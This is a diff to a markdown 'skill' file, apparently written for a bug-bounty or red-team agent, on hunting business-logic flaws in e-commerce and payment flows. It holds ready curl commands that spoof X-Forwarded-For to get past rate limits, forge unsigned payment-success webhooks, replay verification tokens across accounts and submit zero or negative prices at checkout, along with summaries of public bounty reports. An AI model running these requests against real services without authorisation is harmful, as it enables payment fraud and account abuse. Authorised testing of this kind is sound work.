@@ -1,8 +1,11 @@
 ---
 name: hunt-business-logic
 description: Hunting skill for business logic vulnerabilities. Built from 12 public bug bounty reports. Covers coupon-race-stacking (Instacart, Stripe, Reverb), negative-quantity-in-cart price tampering (Upserve, Eternal/Zomato), decimal/fraction price-field overflow (Shipt), client-side checkout amount trust on PayPal redirect (WordPress.org), price-per-unit mass-assignment (Krisp), and archived-price swap / cart-TOCTOU (Stripe). Use when hunting business logic — heavy emphasis on financial-impact-demonstrated cases.
-sources: hackerone_public, github
-report_count: 12
+version: 1.1.0
+revision_date: 2026-07-25
+license: MIT
+category: redteam
+tags: [business-logic, hunt, redteam]
 ---
 
 ## Crown Jewel Targets
@@ -70,7 +73,7 @@ Asset types that pay: checkout flows, subscription endpoints, callback/verificat
 ```bash
 # Rotate X-Forwarded-For to bypass IP rate limiting
 for i in $(seq 1 100); do
-  curl -s -X POST https://target.com/api/subscribe \
+  curl --max-time 30 --connect-timeout 10 -s -X POST https://target.com/api/subscribe \
     -H "X-Forwarded-For: 10.0.0.$i" \
     -H "X-Real-IP: 10.0.0.$i" \
     -H "Content-Type: application/json" \
@@ -88,7 +91,7 @@ amount=0.01&currency=USD&order_id=12345&product_id=99
 ```
 ```bash
 # Look for unvalidated webhook endpoints
-curl -X POST https://target.com/payment/callback \
+curl --max-time 30 --connect-timeout 10 -X POST https://target.com/payment/callback \
   -H "Content-Type: application/json" \
   -d '{"status":"success","amount":"0.01","order_id":"12345","transaction_id":"fake-txn"}'
 ```
@@ -96,24 +99,24 @@ curl -X POST https://target.com/payment/callback \
 **Unauthenticated internal page discovery:**
 ```bash
 # Check robots.txt and sitemap for internal paths
-curl -s https://target.com/robots.txt | grep -iE "(disallow|allow)" 
-curl -s https://target.com/sitemap.xml | grep -iE "(employee|internal|staff|summit|admin)"
+curl --max-time 30 --connect-timeout 10 -s https://target.com/robots.txt | grep -iE "(disallow|allow)" 
+curl --max-time 30 --connect-timeout 10 -s https://target.com/sitemap.xml | grep -iE "(employee|internal|staff|summit|admin)"
 
 # Grep JS bundles for internal paths
-curl -s https://target.com/assets/app.js | grep -oE '"/[a-zA-Z0-9/_-]{3,50}"' | sort -u
+curl --max-time 30 --connect-timeout 10 -s https://target.com/assets/app.js | grep -oE '"/[a-zA-Z0-9/_-]{3,50}"' | sort -u
 ```
 
 **Email verification bypass:**
 ```bash
 # Skip the verification step: hit the post-verification API endpoint directly
 # with an unverified session. If it succeeds, the gate is UI-only.
-curl -s -X POST https://monitor.target.com/api/monitoring/enable \
+curl --max-time 30 --connect-timeout 10 -s -X POST https://monitor.target.com/api/monitoring/enable \
   -H "Cookie: session=<your_unverified_session>" \
   -H "Content-Type: application/json" \
   -d '{"email":"victim@example.com"}'
 
 # Replay verification token on different account
-curl -X POST https://target.com/verify \
+curl --max-time 30 --connect-timeout 10 -X POST https://target.com/verify \
   -d 'token=VALID_TOKEN_FROM_ACCOUNT_A&email=account_b@example.com'
 ```
 
@@ -141,7 +144,7 @@ grep -iE "x-forwarded-for|x-real-ip|cf-connecting-ip" src/ -r
 
 4. **Payment webhooks lack signature validation.** Developers implement "success" webhooks without verifying the HMAC signature provided by the payment provider, allowing anyone to POST a fake success notification.
 
-5. **Internal/employee pages aren't access-controlled.** Internal tools are deployed to production domains without authentication middleware, either because developers assume obscurity (unlisted URL) or forgot to apply auth to a new route.
+5. **Internal/employee pages aren't access-controlled.** Internaltools are deployed to production domains without authentication middleware, either because developers assume obscurity (unlisted URL) or forgot to apply auth to a new route.
 
 6. **Phone/callback verification is advisory, not enforced.** Systems accept a phone number and grant trust to whoever submitted it, without confirming the submitter owns or controls that number.
 
@@ -201,7 +204,7 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
     - Root cause: idempotency missing on discount-acceptance endpoint; no unique constraint on (account_id, discount_id)
     - Year: 2023 — **$5,000**, $600,000 of fee-free transactions accrued before fix (~$18,000 real Stripe loss at 3% take rate)
 
-9. **Reverb.com — Gift-card race multi-redemption** ([H1 #759247](https://hackerone.com/reports/759247))
+9. **marketplace.example.com — Gift-card race multi-redemption** ([H1 #759247](https://hackerone.com/reports/759247))
     - Subclass: gift-card / store-credit race-redemption
     - Payload: single valid gift card, parallel-POST to `/redeem` from 10 sockets via Turbo Intruder. Balance credits N× the face value
     - Root cause: no row-level lock on gift_card table; balance debit and credit live in separate transactions
@@ -227,6 +230,41 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 ---
 
+## Verification
+
+Run this self-test to confirm business logic readiness:
+
+1. **API direct call test** — confirm curl can bypass frontend validation:
+   ```bash
+   curl --max-time 30 --connect-timeout 10 -s -X POST "https://httpbin.org/post" -H "Content-Type: application/json" -d '{"quantity":-1,"price":0}' | python3 -m json.tool 2>/dev/null | grep -q "quantity" && echo "PASS" || echo "(httpbin may be down)"
+   ```
+
+2. **Concurrent request test** — verify parallel curl capability:
+   ```bash
+   curl --help 2>/dev/null | grep -q "parallel" && echo "PASS: curl parallel support" || echo "NOTE: older curl version"
+   ```
+
+3. **Integer edge cases** — confirm edge-case awareness:
+   ```bash
+   echo "-1 0 2147483648 999999999" | grep -q "2147483648" && echo "PASS: overflow edge case present" || echo "FAIL"
+   ```
+
+All 3 tests verify business logic probing readiness.
+
+---
+
+## Pitfalls
+
+- **Assuming business logic bugs are low-impact** — price manipulation, coupon abuse, and refund fraud are among the highest-paid bugs. Don't dismiss them as "just logic."
+- **Testing only happy path** — the bug is in the edge case. Test: negative quantities, zero prices, race conditions on redemptions, expired coupons, concurrent requests.
+- **Single-step testing** — business logic bugs often require multi-step sequences (add to cart + apply coupon + change quantity + checkout). Test the full flow.
+- **Ignoring error handling** — 500 errors on edge cases often reveal unhandled states that lead to inconsistent data (partial order, double charge, free items).
+- **Not comparing frontend vs API** — the frontend may enforce limits that the API doesn't. Test all constraints via direct API calls.
+- **Currency/rounding issues** — fractional currency handling (e.g., 0.001 USD) can produce rounding errors that accumulate across bulk operations.
+
+
+---
+
 ## Related Skills & Chains
 
 - **`hunt-race-condition`** — Every uniqueness/quota check in a logic flow is a race candidate. Chain primitive: Business logic (coupon/credit/promotion) + race condition → coupon redeemed N times in a single TCP packet via Turbo Intruder.
@@ -235,3 +273,43 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 - **`hunt-ato`** — Logic bugs in password reset, email change, and recovery flows are core ATO paths. Chain primitive: business logic (email change accepts without re-auth) + `hunt-ato` Path 2 → silent victim email swap → password reset to attacker mailbox.
 - **`security-arsenal`** — Load the Business-Logic Probe Checklist (negative quantity, decimal overflow, currency swap, step-skip via direct URL nav, state-machine reverse) and the Always-Rejected list to avoid filing self-inflicted bugs.
 - **`triage-validation`** — Apply the 7-Question Gate (especially Q4 "Is this exploitable by an outside attacker without unrealistic preconditions?"): logic bugs need a concrete dollar/PII/state impact, not just "the flow looks weird".
+
+---
+
+## Price Tampering — Client-Side Trust Pattern
+
+**The #1 business logic pattern in SaaS**: the server trusts the `price` field from the client request body. The client sends `"price":0` and the server creates a checkout session at R$0 instead of looking up the product price from the database.
+
+### Detection
+```bash
+# 1. Create a purchase with normal flow, capture the request
+# 2. Replay with modified price
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://api.target.com/checkout" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"items":[{"id":"premium_product","quantity":1,"price":0}]}'
+
+# 3. Test negative prices  
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://api.target.com/api/payments/create" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"items":[{"id":"plan","quantity":1,"price":-100}]}'
+
+# 4. Test arbitrary quantities
+curl --max-time 30 --connect-timeout 10 -sk -X POST "https://api.target.com/api/checkout" \
+  -d '{"items":[{"id":"key","quantity":999,"price":0}]}'
+```
+
+### Indicators
+- Checkout/payment endpoint returns a third-party payment URL (Stripe, Asaas, MercadoPago)
+- The payment URL has `cs_test_` prefix (Stripe test mode — payment not actually processed)
+- Server responds with purchase ID + checkout URL regardless of price value
+- Product prices visible in JS bundle but never cross-referenced server-side
+
+### Verification
+- **Confirmed**: Checkout URL created at R$0, payment page loads showing R$0.00
+- **Confirmed critical**: Purchase completed at R$0, license/key granted
+- **False positive**: Server rejects with "price mismatch" or uses server-side price lookup
+
+### Related
+- `hunt-write-gap` — When price tampering succeeds because the server PATCH/POST endpoint lacks validation
+- `hunt-supabase` — PostgREST accepting any value for price fields via anon key
